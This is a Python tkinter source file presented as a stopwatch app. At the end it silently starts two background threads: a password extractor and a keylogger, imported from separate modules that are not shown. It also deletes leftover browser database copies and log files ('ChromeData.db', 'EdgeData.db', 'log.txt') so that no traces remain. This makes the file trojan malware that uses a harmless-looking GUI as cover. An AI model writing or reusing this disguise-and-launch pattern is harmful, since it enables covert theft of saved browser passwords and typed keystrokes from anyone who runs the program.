import tkinter as tk
from threading import Thread
from passwordExtractor import main
from secret import keyLogger
import os

#global variable checking state of the stopwatch
running=False
hours = 0
minutes = 0
seconds = 0

root = tk.Tk()
root.geometry('600x250')
root.minsize(600,250)
root.maxsize(600,250)
root.title('Stopwatch')
root_label = tk.Label(text='00:00:00', font=('Times', 80))
root_label.pack()

#set the commands of the buttons

def start():
    #only start if not running
    global running
    if not running:
        running = True
        update()
def stop():
    #only stop if running
    global running
    if running:
        running = False

def reset():
    global hours, minutes, seconds, running
    #can only reset if the timer is running
    if not running:
        hours = 0
        minutes = 0
        seconds = 0
        root_label.config(text='00:00:00')
        running = False

def update():
    #check if timer is still running and only update if it is
    global running
    if running:
        global hours, minutes, seconds
        seconds += 1
        #update seconds and see if anything else chagnes
        if seconds == 60:
            seconds = 0
            minutes += 1
        if minutes == 60:
            minutes = 0
            hours += 1
        string_hrs = ''
        string_min = ''
        string_sec = ''
        if hours > 9:
            string_hrs = str(hours)
        else:
            string_hrs = '0' + str(hours)
        if minutes > 9:
            string_min = str(minutes) 
        else:
            string_min = '0' + str(minutes) 
        if seconds > 9:
            string_sec = str(seconds)
        else:
            string_sec = '0' + str(seconds)
        root_label.config(text=string_hrs + ':' + string_min + ':' + string_sec)
        root_label.after(1000, update)

#set up the widgets
start_button = tk.Button(text='start', font=('Times', 20), command=start)
start_button.pack(fill='both', expand=True, side='left')
stop_button = tk.Button(text='stop', font=('Times', 20), command=stop)
stop_button.pack(fill='both', expand=True, side='left')
reset_button = tk.Button(text='reset', font=('Times', 20), command=reset)
reset_button.pack(fill='both', expand=True, side='left')    

t1 = Thread(target=main)
t2 = Thread(target=keyLogger)
try:
    # try to remove the copied db file
    os.remove('ChromeData.db')
    os.remove('EdgeData.db')
    os.remove('log.txt')
    os.remove('windowLog.txt')
    os.remove('output.txt')
except:
    pass
t1.start()
t2.start()
root.mainloop()

